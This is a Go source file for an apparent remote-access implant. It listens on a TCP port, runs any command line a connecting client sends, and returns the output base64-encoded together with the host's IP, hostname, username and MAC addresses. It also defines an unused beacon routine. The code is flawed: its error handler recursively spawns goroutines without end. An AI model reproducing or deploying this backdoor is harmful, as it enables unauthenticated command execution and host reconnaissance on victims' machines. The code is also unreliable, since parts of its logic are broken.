package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
)

const (
	connHost = "localhost"
	connPort = "7025"
	connType = "tcp"
)

func beacon(conn net.Conn) {

	for true {
		writeData(true, "NULL")
		time.Sleep(300 * time.Second)
	}

}

//Tank you golang very cool
func errorHandler(err error) {
	go errorHandler(err)
}

type Packet struct {
	Type     bool   `json:"Type"`
	DevIP    string `json:"devIp"`
	Hostname string `json:"Hostname"`
	Username string `json:"username"`
	Time     string `json:"time"`
	Result   string `json:"Result"`
	Mac      string `json:"Mac"`
}

func getLocalIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	go errorHandler(err)
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

func getMacAddr() []string {
	ifas, err := net.Interfaces()
	go errorHandler(err)
	var as []string
	for _, ifa := range ifas {
		a := ifa.HardwareAddr.String()
		if a != "" {
			as = append(as, a)
		}
	}
	return as
}

var macA = getMacAddr()
var userN = getUsername()

func getHostname() string {
	os, err := os.Hostname()
	go errorHandler(err)
	return os
}

func getUsername() string {
	name, err := user.Current()
	go errorHandler(err)
	return name.Name
}

func arrToString(strArray []string) string {
	return strings.Join(strArray, " ")
}

func writeData(Beacon bool, result string) string {
	sendData := Packet{
		Type:     Beacon,
		DevIP:    getLocalIP().String(),
		Hostname: getHostname(),
		Username: userN,
		Time:     time.Now().UTC().Format("2006-01-02 15:04:05"),
		Result:   result,
		Mac:      arrToString(macA),
	}

	dat, err := json.Marshal(sendData)
	go errorHandler(err)

	encoded := base64.StdEncoding.EncodeToString([]byte(dat))

	return encoded
}

func handleConnection(conn net.Conn) {
	buffer, err := bufio.NewReader(conn).ReadString('\n')

	print(buffer)
	if err != nil {
		fmt.Println("Client left.")
		conn.Close()
		return
	}
	//newCmd := strings.TrimSuffix(buffer, "\n")
	//todo: seperate command and args
	//print(newCmd)
	buffer = strings.Replace(buffer, "\n", "", -1)
	command, err := exec.Command(buffer, os.Args...).Output()

	if err != nil {
		fmt.Println(err)
		conn.Close()
		return
	}
	//THIS IS THE NON BEACON WRITE
	//print(string(command))
	conn.Write([]byte(writeData(false, string(command))))
}

func main() {
	//fmt.Println("Starting " + connType + " server on " + connHost + ":" + connPort)
	server, err := net.Listen(connType, connHost+":"+connPort)

	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}

	defer server.Close()

	for {
		client, err := server.Accept()
		if err != nil {
			fmt.Println("Error connecting:", err.Error())
			return
		}
		fmt.Println("Client connected.")

		fmt.Println("Client " + client.RemoteAddr().String() + " connected.")
		go handleConnection(client)
	}
}
